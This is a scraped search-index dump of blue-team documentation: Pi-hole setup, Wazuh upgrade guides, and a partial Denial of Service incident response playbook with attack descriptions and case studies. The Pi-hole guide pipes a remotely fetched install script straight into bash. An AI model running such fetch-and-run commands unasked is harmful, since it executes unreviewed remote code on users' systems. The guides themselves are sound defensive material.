Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-17","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-18","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-19","content":"   ","version":"Next","tagName":"h2"},{"title":"Video Tutorials​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#video-tutorials","content":" ","version":"Next","tagName":"h2"},{"title":"MISP installation on Ubuntu using docker​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#misp-installation-on-ubuntu-using-docker","content":"   ","version":"Next","tagName":"h3"},{"title":"Glance on MISP Dashboard​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#glance-on-misp-dashboard","content":"  ","version":"Next","tagName":"h3"},{"title":"setup guide for pi hole in Debian 12","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/pihole-setup","content":"","keywords":"","version":"Next"},{"title":"sudo apt update && sudo apt upgrade -y​","type":1,"pageTitle":"setup guide for pi hole in Debian 12","url":"/redback-documentation/docs/cybersecurity/Blue Team/pihole-setup#sudo-apt-update--sudo-apt-upgrade--y","content":"   this will update and upgrade the system.  Step 4:Install required dependencies. For this run the command:  ","version":"Next","tagName":"h3"},{"title":"sudo apt install curl gnupg -y​","type":1,"pageTitle":"setup guide for pi hole in Debian 12","url":"/redback-documentation/docs/cybersecurity/Blue Team/pihole-setup#sudo-apt-install-curl-gnupg--y","content":"   This ensures you can fetch the Pi-hole installation script securely  Step 5:Download and run the pi-hole installation script. For this run the command:  ","version":"Next","tagName":"h3"},{"title":"curl -sSL https://install.pi-hole.net | bash​","type":1,"pageTitle":"setup guide for pi hole in Debian 12","url":"/redback-documentation/docs/cybersecurity/Blue Team/pihole-setup#curl--ssl-httpsinstallpi-holenet--bash","content":"   Wait for the installation to be completed and then you’ll see this:  Step 6:After pressing ok for the introduction, you’ll see this:  Since we’ve already created a static ip, click on continue. Next, you'll be asked to select dns server. Please select google dns.  After selecting press ok. After this you’ll be asked if you want to add a blacklist from steven’s blacklist. Click yes to it.  Pi hole by itself doesn’t have any blacklist or the whitelist. We need to add from 3rd party providers. Ill provide details about that later. Next click yes to creating admin web interface:  After this, click yes to installing lighttpd webserver and the required modules:  Next yes to query logging:  Next select the anonymous mode:  That’s it for this step. After completing all this you’ll be redirected to the terminal. Wait for the installation to be completed. After the installation is complete, you’ll see this:  Note down your password and use the url to log into the web interface.  ","version":"Next","tagName":"h3"},{"title":"Configuration:​","type":1,"pageTitle":"setup guide for pi hole in Debian 12","url":"/redback-documentation/docs/cybersecurity/Blue Team/pihole-setup#configuration","content":" now that pi hole is installed. First, I’ll give you the blacklists and whitelists link here below. After that ill explain how to add them.  ","version":"Next","tagName":"h2"},{"title":"Blacklists:​","type":1,"pageTitle":"setup guide for pi hole in Debian 12","url":"/redback-documentation/docs/cybersecurity/Blue Team/pihole-setup#blacklists","content":" • https://firebog.net/this will have a collection of blacklists in it. Don’t add to much, just maybe a few.  ","version":"Next","tagName":"h2"},{"title":"Whitelists:​","type":1,"pageTitle":"setup guide for pi hole in Debian 12","url":"/redback-documentation/docs/cybersecurity/Blue Team/pihole-setup#whitelists","content":" • https://github.com/anudeepND/whitelist/blob/master/domains/whitelist.txt  ","version":"Next","tagName":"h2"},{"title":"how to set these blacklist and whitelists:​","type":1,"pageTitle":"setup guide for pi hole in Debian 12","url":"/redback-documentation/docs/cybersecurity/Blue Team/pihole-setup#how-to-set-these-blacklist-and-whitelists","content":" whitelists:• Go to terminal and run this command:  ","version":"Next","tagName":"h2"},{"title":"curl -o whitelist.txt https://raw.githubusercontent.com/anudeepND/whitelist/master/domains/whitelist.txt​","type":1,"pageTitle":"setup guide for pi hole in Debian 12","url":"/redback-documentation/docs/cybersecurity/Blue Team/pihole-setup#curl--o-whitelisttxt-httpsrawgithubusercontentcomanudeepndwhitelistmasterdomainswhitelisttxt","content":"   • Next run this command. This will help to automatically add all the domains in the list to whitelist:  while read domain; do pihole -w $domain; done &lt; whitelist.txt  Next go to pi hole, go to the menu – tools – update gravity:  Then click on update, this will put the whitelist inside the pi hole.  Now you can see the whitelists inside pi hole:  ","version":"Next","tagName":"h3"},{"title":"Adding blacklists:​","type":1,"pageTitle":"setup guide for pi hole in Debian 12","url":"/redback-documentation/docs/cybersecurity/Blue Team/pihole-setup#adding-blacklists","content":" Go to pi hole menu – adlists:  Next go to firebog link I’ve provided above. It will have a bunch of url. Copy one and paste it here:  Click add and the list will be added:  After doing this, go to update gravity and click update this will update the additional change we made now. ","version":"Next","tagName":"h3"},{"title":"Wazuh Agent Upgrade Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Wazuh Agent Upgrade Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide#overview","content":" This technical guide provides step-by-step instructions on how to safely upgrade the Wazuh Agent to the latest version, ensuring alignment with other Wazuh components – Dashboard, Indexer, and Manager.  ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"Wazuh Agent Upgrade Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide#prerequisites","content":" A Wazuh agent installed on the Docker host.Admin/Root access to the Wazuh Docker host (Linux server).Familiarity with docker, docker-compose, and basic Linux operations.  ","version":"Next","tagName":"h2"},{"title":"Important Note​","type":1,"pageTitle":"Wazuh Agent Upgrade Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide#important-note","content":" If the docker-compose command does not work on your system, use docker compose instead (without a hyphen).  ","version":"Next","tagName":"h2"},{"title":"Upgrade Steps​","type":1,"pageTitle":"Wazuh Agent Upgrade Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide#upgrade-steps","content":" ","version":"Next","tagName":"h2"},{"title":"Step 1: Install the GPG Key​","type":1,"pageTitle":"Wazuh Agent Upgrade Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide#step-1-install-the-gpg-key","content":" Download the key curl -O https://packages.wazuh.com/key/GPG-KEY-WAZUH Import the key sudo gpg --no-default-keyring --keyring /usr/share/keyrings/wazuh.gpg --import GPG-KEY-WAZUH Fix permissions sudo chmod 644 /usr/share/keyrings/wazuh.gpg     ","version":"Next","tagName":"h3"},{"title":"Step 2: Add the Wazuh Repository​","type":1,"pageTitle":"Wazuh Agent Upgrade Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide#step-2-add-the-wazuh-repository","content":" echo &quot;deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main&quot; | sudo tee -a /etc/apt/sources.list.d/wazuh.list       ","version":"Next","tagName":"h3"},{"title":"Step 3: Update Wazuh Agent to the Latest Version​","type":1,"pageTitle":"Wazuh Agent Upgrade Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide#step-3-update-wazuh-agent-to-the-latest-version","content":" sudo apt-get update sudo apt-get install wazuh-agent        ","version":"Next","tagName":"h3"},{"title":"Step 4: Disable Wazuh Repo (to prevent auto-upgrades)​","type":1,"pageTitle":"Wazuh Agent Upgrade Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide#step-4-disable-wazuh-repo-to-prevent-auto-upgrades","content":" After the upgrade, disable the Wazuh repository to avoid undesired upgrades and compatibility issues and ensure version alignment with the Wazuh Manager component.  sudo sed -i &quot;s/^deb/#deb/&quot; /etc/apt/sources.list.d/wazuh.list sudo apt-get update       ","version":"Next","tagName":"h3"},{"title":"Step 5: Restart Wazuh API Services​","type":1,"pageTitle":"Wazuh Agent Upgrade Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide#step-5-restart-wazuh-api-services","content":" Access the Wazuh Manager container: docker exec -it --user root single-node-wazuh.manager-1 bash Restart all Wazuh services in Wazuh manager-1: /var/ossec/bin/wazuh-control restart Verify the service status: /var/ossec/bin/wazuh-control status Review API logs for issues (if necessary): tail -f /var/ossec/logs/ossec.log     ","version":"Next","tagName":"h3"},{"title":"Step 6: Restart and Validate Running​","type":1,"pageTitle":"Wazuh Agent Upgrade Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide#step-6-restart-and-validate-running","content":" sudo systemctl restart wazuh-agent sudo systemctl status wazuh-agent   ✅ Look for:  Active: active (running)       ","version":"Next","tagName":"h3"},{"title":"Step 7: Post-Upgrade Validation​","type":1,"pageTitle":"Wazuh Agent Upgrade Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide#step-7-post-upgrade-validation","content":" Log in to the Wazuh dashboard via a browser.Navigate to: Agents → Manage AgentsConfirm the following: The agent is listed.The agent status is shown as ACTIVE.The version matches the upgraded version (e.g., 4.11.2).  ✅ This confirms a successful upgrade and validates registration, version alignment, and heartbeat communication with the Wazuh Manager.    ","version":"Next","tagName":"h3"},{"title":"Reference​","type":1,"pageTitle":"Wazuh Agent Upgrade Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-agent-upgrade-guide#reference","content":" https://documentation.wazuh.com/current/upgrade-guide/wazuh-agent/linux.html ","version":"Next","tagName":"h2"},{"title":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#overview","content":" This technical guide provides step-by-step instructions to safely upgrade Wazuh Docker to the latest version while preserving existing configurations and data.  ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#prerequisites","content":" Existing Wazuh Docker deployment – This guide assumes the Wazuh stack (Manager, Indexer, Dashboard, Agent) is already deployed using Docker.Admin/Root access to the Wazuh Docker host (Linux server).Familiarity with docker, docker-compose, and basic Linux operations.Backup of existing docker-compose.yml and config/ directory.Docker volumes must not be deleted to preserve data.The following needs to be installed: Dockerdocker-composegit  ","version":"Next","tagName":"h2"},{"title":"Important Note​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#important-note","content":" If the docker-compose command does not work on your system, use docker compose instead (without a hyphen).  ","version":"Next","tagName":"h2"},{"title":"Upgrade Steps​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#upgrade-steps","content":" ","version":"Next","tagName":"h2"},{"title":"Step 1: Backup​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#step-1-backup","content":" Check for running Wazuh containers. docker ps Find the active 'docker-compose.yml' path by checking a Wazuh container (e.g., indexer) docker inspect 'single-node_wazuh.indexer_1' | grep -i compose Backup current configuration cd /path/to/wazuh-docker/... cp docker-compose.yml docker-compose.yml.backup cp -r config/ config_backup/       ","version":"Next","tagName":"h3"},{"title":"Step 2: Stop Containers (Preserves Volumes)​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#step-2-stop-containers-preserves-volumes","content":" docker-compose down       ","version":"Next","tagName":"h3"},{"title":"Step 3: Download New Wazuh Docker Files​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#step-3-download-new-wazuh-docker-files","content":" Fetch updates git fetch --all Check the Wazuh website and identify the latest stable Wazuh version (in this case, 4.11.2). Checkout that version. git checkout v4.11.2       ","version":"Next","tagName":"h3"},{"title":"Step 4: Compare and Merge Changes​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#step-4-compare-and-merge-changes","content":" Restore the old docker-compose.yml backed up in 'Step 1': rm docker-compose.yml cp docker-compose.yml.backup docker-compose.yml Ensure the following in the single-node/docker-compose.yml file: 2.1. Ensure the image versions correspond to the current deployment (e.g., v4.11.2). services: wazuh.manager: image: wazuh/wazuh-manager:4.11.2 wazuh.indexer: image: wazuh/wazuh-indexer:4.11.2 wazuh.dashboard: image: wazuh/wazuh-dashboard:4.11.2 2.2. Modify the OPENSEARCH_JAVA_OPTS environment variable to allocate more RAM to the Wazuh indexer container (if needed).OPENSEARCH_JAVA_OPTS=-Xms1g -Xmx1g Update the defaultRoute parameter in the Wazuh dashboard configuration file single-node/config/wazuh_dashboard/opensearch_dashboards.yml is set to the value below (if needed).uiSettings.overrides.defaultRoute: /app/wz-home Modify the tag of image generator (if needed). single-node/generate-indexer-certs.yml services: generator: image: wazuh/wazuh-certs-generator:0.0.2 Recreate the certificates: docker-compose -f generate-indexer-certs.yml run --rm generator Restore wazuh_manager.conf from backup: cd single-node/config/wazuh_cluster/ rm wazuh_manager.conf cp ../../config_backup/wazuh_cluster/wazuh_manager.conf wazuh_manager.conf     ","version":"Next","tagName":"h3"},{"title":"Step 5: Start the New Version of Wazuh​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#step-5-start-the-new-version-of-wazuh","content":" docker compose up -d       ","version":"Next","tagName":"h3"},{"title":"Step 6: Post-Upgrade Validation​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#step-6-post-upgrade-validation","content":" Check container health - ensure the containers are up and running: docker ps Access the Wazuh Dashboard and ensure the dashboard and indexer are functioning: https://&lt;your-dashboard-ip&gt;/app/wz-homeExample: https://redback.it.deakin.edu.au/app/wz-home If issues occur, check logs: docker logs single-node_wazuh.dashboard_1 docker logs single-node_wazuh.indexer_1 docker logs single-node_wazuh.manager_1     ","version":"Next","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#troubleshooting","content":" Problem\tRecommended StepsDashboard not loading\t• Check wazuh.dashboard logs – docker logs single-node_wazuh.dashboard_1 Indexer failing\t• Check Java memory settings and recreated certificates. • Check wazuh.indexer logs – docker logs single-node_wazuh.indexer_1 Manager not starting\t• Verify wazuh_manager.conf syntax and permissions. • Check wazuh.manager logs – docker logs single-node_wazuh.manager_1 Certificates errors\t• Rerun the certificate generator process (Step 4, point 5 – Recreate the certificates)    ","version":"Next","tagName":"h2"},{"title":"Notes​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#notes","content":" Always backup configuration files before proceeding.docker-compose down only stops/removes containers; data volumes are unaffected and preserved unless explicitly removed.Some custom setups and integrations might need to be manually reconfigured after the upgrade.Always review Wazuh Release Notes for details on changes before upgrading.    ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Wazuh Docker Upgrade Guide (While Preserving Existing Configurations)","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-upgrade/wazuh-docker-upgrade-guide#references","content":" https://documentation.wazuh.com/current/deployment-options/docker/upgrading-wazuh-docker.htmlhttps://documentation.wazuh.com/current/release-notes/index.html ","version":"Next","tagName":"h2"},{"title":"Denial of Service Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"1 Introduction​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#1-introduction","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#11-overview","content":" Denial of Service (DoS) assaults are a serious threat to the availability and integrity of online services in today's interconnected digital ecosystem. A denial-of-service (DoS) attack attempts to stop a system, network, or service from operating normally by flooding it with excessive amounts of unauthorized traffic or resource requests. These assaults have the potential to cause downtime, monetary losses, reputational harm, and even jeopardize the privacy of confidential data.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#12-purpose","content":" This Denial of Service (DoS) Incident Response Playbook aims to offer a thorough structure for identifying, preparing, and responding to DoS attacks. This playbook tries to protect vital assets and services from disruptive cyber threats and reduce the effect of DoS incidents on our organization's operations by providing preventive measures, detection methods, response protocols, and recovery plans.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#13-attack-definition","content":" An attempt to bring down a computer or network and prevent its intended users from using it is known as a Denial-of-Service (DoS) attack. DoS attacks achieve this by transmitting information that causes a crash or by overloading the target with traffic. The denial of service or resource to legitimate users, such as employees, members, or account holders, is the result of a denial-of-service attack in both cases.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#14-scope","content":" This playbook includes a thorough method for handling Denial of Service (DoS) attacks in the operating environment and infrastructure of our company. From pre-incident planning and detection to mitigation, recovery, and post-event review, it covers every stage of incident handling. The principles and processes described in this playbook can be applied to mitigate related threats, such as Distributed Denial of Service (DDoS) attacks, even if the primary focus of attack is DoS.  ","version":"Next","tagName":"h3"},{"title":"2 Attack Types​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#2-attack-types","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 UDP Flood​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#21-udp-flood","content":" Attackers using UDP floods make use of UDP's intrinsic simplicity—that is, its connectionless nature, in contrast to TCP. Attackers frequently target ports or services as they bombard the target system with a massive volume of UDP packets. When the target's network bandwidth is overloaded or its processing power is depleted by the flood of UDP packets, it stops responding to legitimate traffic. Because UDP does not ensure delivery or order, attackers can fake the IP addresses used to originate their attacks, making it challenging to identify their origins.  Case Study: GitHub DDoS Attack (2018)  Overview: The GitHub platform experienced the largest-ever recorded DDoS attack, leveraging Memcached servers to amplify the traffic directed at GitHub's systems.Impact: The attack peaked at 1.35 Tbps, causing temporary disruptions in service.Response: GitHub mitigated the attack using Akamai's DDoS protection services and increased network resilience.  ","version":"Next","tagName":"h3"},{"title":"2.2 TCP SYN Flood​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#22-tcp-syn-flood","content":" TCP SYN Flood attacks exploit the Transmission Control Protocol's (TCP) three-way handshake protocol. TCP SYN packets are sent by attackers in enormous quantities; these packets form the initial stage of a TCP connection. They do not, however, send the last ACK packet to complete the handshake, which leaves the target system with a backlog of partially open connections. As a result, valid users are unable to connect to the server because the target's RAM and connection table entries are depleted.  Case Study: Mafiaboy DDoS Attack (2000)  Overview: A teenager known as Mafiaboy launched a series of DDoS attacks against major websites like Yahoo!, Amazon, and CNN, using TCP SYN floods.Impact: The attacks caused significant disruptions and highlighted vulnerabilities in high-profile websites.Response: The incidents led to increased awareness and improvements in DDoS mitigation strategies.  ","version":"Next","tagName":"h3"},{"title":"2.3 HTTP Flood​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#23-http-flood","content":" The goal of HTTP flood attacks is to overload web servers with many HTTP requests. Attackers can target URLs, forms, or online application functionalities with a large volume of requests by using botnets or other automated methods. HTTP Flood assaults cause the server's performance to deteriorate, rendering it incapable of responding to valid user requests by using up the server's memory, processing power, and network bandwidth. Consequently, there is a disruption in service or downtime because of the web server becoming slow or unresponsive to authorized users.  Case Study: Imperva DDoS Attack (2019)  Overview: A large-scale HTTP flood attack targeted Imperva's infrastructure, using a botnet to generate massive amounts of traffic.Impact: The attack caused temporary service interruptions and highlighted the need for robust application-level defenses.Response: Imperva utilized advanced DDoS mitigation techniques and further enhanced their defences.  ","version":"Next","tagName":"h3"},{"title":"2.4 Ping Flood (ICMP Flood)​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#24-ping-flood-icmp-flood","content":" Ping Flood attacks, sometimes referred to as &quot;Ping of Death&quot; or ICMP Flood attacks, overwhelm the target system with an endless barrage of Internet Control Message Protocol (ICMP) echo request packets. These packets, which take advantage of flaws in operating systems or network devices, are sent quickly and are usually larger than the allowed size. The target machine experiences sluggish performance or even crashes because of overusing its CPU and network resources processing these packets. Ping Flood assaults are hard to counter because they might originate from several sources at once and are easy to conduct.  Case Study: Smurf Attack (1998)  Overview: The Smurf attack, a type of ICMP flood, targeted multiple organizations, amplifying traffic and directing it towards the victims.Impact: The attack disrupted services and highlighted the vulnerabilities in handling ICMP traffic.Response: Organizations implemented filters and disabled ICMP broadcasts to mitigate the attack.  ","version":"Next","tagName":"h3"},{"title":"2.5 Slowloris​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#25-slowloris","content":" Attacks known as &quot;slowloris&quot; are named after the way they use server resources—low and slow. Slowloris keeps a small number of connections active for a long time rather than flooding the server with requests. Attackers make sure that every connection is active by sending HTTP headers to the server very slowly. Slowloris stops authentic users from creating new connections by filling the server's connection slots with incomplete requests. A denial- of-service attack against authorized users attempting to access the web server may result from this resource exhaustion approach.  Case Study: Iranian Cyber Army Attack (2009)  Overview: In 2009, the Iranian Cyber Army used the Slowloris attack to exploit web server vulnerabilities by keeping connections open with slow HTTP requests. This led to server resource exhaustion and denial-of-service, impacting sites like Twitter and Baidu.Impact: The attack highlighted vulnerabilities in web server handling of persistent connections.Response: Organizations updated their web server configurations to limit the impact of such attacks.  ","version":"Next","tagName":"h3"},{"title":"2.6 DNS Amplification​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#26-dns-amplification","content":" DNS Amplification attacks exploit vulnerabilities in DNS servers to amplify the volume of traffic directed at the target system. Attackers send small DNS queries with a spoofed source IP address to vulnerable DNS servers, requesting large DNS responses. These responses, which are much larger than the original queries, are directed towards the victim's IP address, overwhelming its network bandwidth. DNS Amplification attacks leverage the inherent trust between DNS servers, making it difficult to trace the origin of the attack.  Case Study: Spamhaus DDoS Attack (2013)  Overview: Attackers used DNS amplification to target Spamhaus, a spam-fighting organization, with an attack that peaked at 300 Gbps.Impact: The attack caused significant disruptions to Spamhaus's services and other parts of the internet infrastructure.Response: Spamhaus worked with various ISPs and DDoS protection services to mitigate the attack.  ","version":"Next","tagName":"h3"},{"title":"2.7 NTP Amplification​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#27-ntp-amplification","content":" NTP amplification attacks are comparable to DNS amplification attacks in that they increase the amount of traffic going to the target system by taking advantage of vulnerable Network Time Protocol (NTP) servers. Attackers make small NTP queries to NTP servers, asking huge NTP answers, using a faked source IP address. The victim's IP address is the target of these replies, which are usually significantly larger than the initial queries and interrupt services by congesting the network. Because the NTP protocol is UDP-based, NTP amplification attacks are challenging to counter.  Case Study: Cloudflare DDoS Attack (2014)  Overview: Cloudflare experienced a massive NTP amplification attack that generated traffic exceeding 400Gbps.Impact: The attack caused widespread disruptions and highlighted the need for securing NTP servers.Response: Cloudflare and other organizations implemented measures to secure NTP servers and filter malicious traffic.  ","version":"Next","tagName":"h3"},{"title":"2.8 Smurf Attack​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#28-smurf-attack","content":" Smurf Attacks increases the amount of traffic going towards the target system by taking advantage of IP networks' ICMP Echo Reply functionality. A lot of ICMP echo request (ping) packets are sent by attackers to IP broadcast addresses, pretending that the victim's IP address is the originating IP address. As a result, the victim's IP address triggers responses from every computer on the network, exceeding its available bandwidth and resources.  Case Study: CERT Smurf Attack (1999)  Overview: The Computer Emergency Response Team (CERT) was targeted with a Smurf attack, using ICMP echo replies to flood their network.Impact: The attack disrupted CERT's operations and highlighted vulnerabilities in handling broadcast traffic.Response: CERT and other organizations implemented measures to filter and block ICMP echo replies directed at broadcast addresses.  ","version":"Next","tagName":"h3"},{"title":"3 Stakeholders​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#3-stakeholders","content":" IT Administration: The IT administration oversees the organization's servers, networks, and other IT infrastructure. They are essential in identifying, assessing, and minimising a denial-of-service attack in addition to organising the response to the occurrence.Cyber Incident Response Team: An organization's cyber security incident response team (CSIRT) is a specialised unit tasked with handling security incidents and breaches. Their main objective is to quickly locate, contain, and address issues to lessen their effects. CSIRTs are essential for safeguarding an organization's priceless assets, good name, and customers.External Service Providers: For a variety of IT services, companies may depend on outside vendors like internet service providers (ISPs), cloud service providers, or managed security service providers (MSSPs). By working together with these suppliers, the company can better respond to the denial-of-service attack and make use of more resources and experience.Technical Support Team: To troubleshoot and resolve technical issues associated with the DoS attack, the technical support team provides assistance. They can assist in promptly returning regular operations to normal and offer support to end customers impacted by the occurrence.End Users: If the DoS attack prevents end users from accessing services or apps, it could influence them. Minimising the impact on the position they hold can be achieved by keeping them updated on the situation and offering advice on workarounds or substitute solutions.Senior Management/Executive Leadership: In deciding how to respond to the DoS attack, senior management, or executive leadership assigns resources, sets strategic direction, and takes choices. They could also be in charge of maintaining the organization's reputation and dealing with outside stakeholders.  ","version":"Next","tagName":"h2"},{"title":"RACI Chart for Incident Response​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Denial of Service Incident Response Playbook#raci-chart-for-incident-response","content":" Task/Activity\tIT Administration\tCSIRT\tExternal Service Providers\tTechnical Support Team\tEnd Users\tSenior ManagementPreparation Establish incident response team\tR, C\tA, R\tI\tI\tI\tI Develop response procedures\tA, R\tR, C\tI\tI\tI\tI Conduct training sessions\tA, R\tR\tI\tI\tI\tI Implement surveillance systems\tA, R\tR\tI\tI\tI\tI Detection Monitor system logs and traffic\tA, R\tR\tI\tI\tI\tI Use IDS and SIEM tools\tA, R\tR\tI\tI\tI\tI Analyse alerts\tA, R\tR\tI\tI\tI\tI Analysis Conduct forensic analysis\tA, R\tR\tI\tI\tI\tI Determine impact\tA, R\tR\tI\tI\tI\tI Identify threat actor 